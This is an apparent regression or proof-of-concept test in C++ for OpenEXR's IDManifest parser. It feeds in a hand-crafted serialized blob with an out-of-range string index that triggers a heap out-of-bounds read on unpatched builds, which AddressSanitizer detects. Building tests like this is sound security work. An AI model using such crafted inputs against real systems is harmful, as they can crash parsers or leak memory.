//
// Probe: feed a crafted serialized IDManifest blob to the public
// Imf::IDManifest(const char*, const char*) constructor.
//
// The blob is well-formed up to the string-index field of the first
// table entry, whose index (7) is inside the string table but past the
// entries the RLE mapping ranges actually provide.
//
// clean build : constructor returns (or throws a clean InputExc) -> exit 0
// buggy build : heap out-of-bounds read -> AddressSanitizer abort
//

#include "ImfIDManifest.h"

#include <stdio.h>
#include <stdexcept>
#include <string.h>

static const unsigned char manifestData[] = {
    /* version                        */ 0x00, 0x00, 0x00, 0x00,

    /* string list: 8 strings         */ 0x08, 0x00, 0x00, 0x00,
    /*   8 varint lengths, each 2     */ 0x02, 0x02, 0x02, 0x02,
    /**/                                  0x02, 0x02, 0x02, 0x02,
    /*   string 0 (no prefix)         */ 'a',  '0',
    /*   strings 1..7: prefix byte 0  */ 0x00, '1',  0x00, '2',  0x00, '3',
    /**/                                  0x00, '4',
    /**/                                  0x00, '5',  0x00, '6',  0x00, '7',

    /* RLE mapping: 1 range [0,0]     */ 0x01, 0x00, 0x00, 0x00,
    /**/                                  0x00, 0x00, 0x00, 0x00,
    /**/                                  0x00, 0x00, 0x00, 0x00,

    /* 1 manifest entry               */ 0x01, 0x00, 0x00, 0x00,

    /*   channel list: 1, "G"         */ 0x01, 0x00, 0x00, 0x00,
    /**/                                  0x01, 'G',
    /*   component list: 1, "x"       */ 0x01, 0x00, 0x00, 0x00,
    /**/                                  0x01, 'x',
    /*   lifetime                     */ 0x00,
    /*   hash scheme "none"           */ 0x04, 0x00, 0x00, 0x00,
    /**/                                  'n',  'o',  'n',  'e',
    /*   encoding scheme "id"         */ 0x02, 0x00, 0x00, 0x00,
    /**/                                  'i',  'd',
    /*   storage scheme 2 (varint)    */ 0x02,
    /*   table size 1                 */ 0x01, 0x00, 0x00, 0x00,
    /*   entry 0: id 1                */ 0x01,
    /*   string index 7               */ 0x07
};

int
main (void)
{
    try
    {
        Imf::IDManifest manifest (
            reinterpret_cast<const char*> (manifestData),
            reinterpret_cast<const char*> (manifestData) +
                sizeof (manifestData));

        printf ("parsed %zu channel groups\n", manifest.size ());
    }
    catch (const std::exception& e)
    {
        printf ("rejected: %s\n", e.what ());
    }
    return 0;
}
